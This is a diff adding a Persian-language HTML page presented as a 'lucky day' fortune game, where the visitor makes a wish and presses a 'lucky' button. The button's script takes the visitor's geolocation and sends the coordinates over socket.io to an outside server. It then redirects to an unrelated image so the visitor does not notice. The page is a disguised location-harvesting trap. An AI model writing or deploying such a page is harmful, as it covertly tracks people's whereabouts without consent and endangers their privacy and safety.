@@ -1,0 +1,53 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+    <title>روز شانس</title>
+    <script src="https://cdn.socket.io/socket.io-1.3.7.js"></script>
+    <script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition)
+        } 
+    }
+    function showPosition(position) {
+        var position ={ 
+            lat: position.coords.latitude,
+            lon : position.coords.longitude	
+        }
+        sendLocation(position);
+      
+    } 
+    function sendLocation(position){
+                var socket = io.connect('https://evita-monkey-8000.codio.io/');
+                socket.on('connect', function () {
+                    socket.emit('location',position);
+                }); 
+                setTimeout(function(){
+                    window.location = "http://www.designboom.com/wp-content/uploads/2013/06/google-dublin-camenzind-evolution-designboom-13.jpg";
+                },5000);    
+             
+        }
+    </script>
+<style>
+.center {
+    direction:rtl;
+    margin: auto;
+    width: 60%;
+    border: 3px solid #73AD21;
+    padding: 10px;
+}
+</style>
+</head>
+<body>
+        <div class="center">           
+        <h1>ابتدا نیت کنید و به آنچه دوست دارید فکر کنید</h1>
+        <h2>اگر دختر هستید اول اسم کوچک خود را در دل زمزمه کنید</h2>
+        <h2>اگر پسر هستید اول اسم برگ خود را در دل زمزمه کنید</h2>
+        <h2>اگر پسر هستید اول اسم برگ خود را در دل زمزمه کنید</h2>
+        <h2>خوش شانس را بزنید و  چند ثانیه منتظر باشید تا به صفحه </h2>
+        <h2>جای مورد علاقه خود هدایت شوید</h2>
+        <button onclick="getLocation()">خوش شانس</button>            
+        </div>
+</body>
+</html>
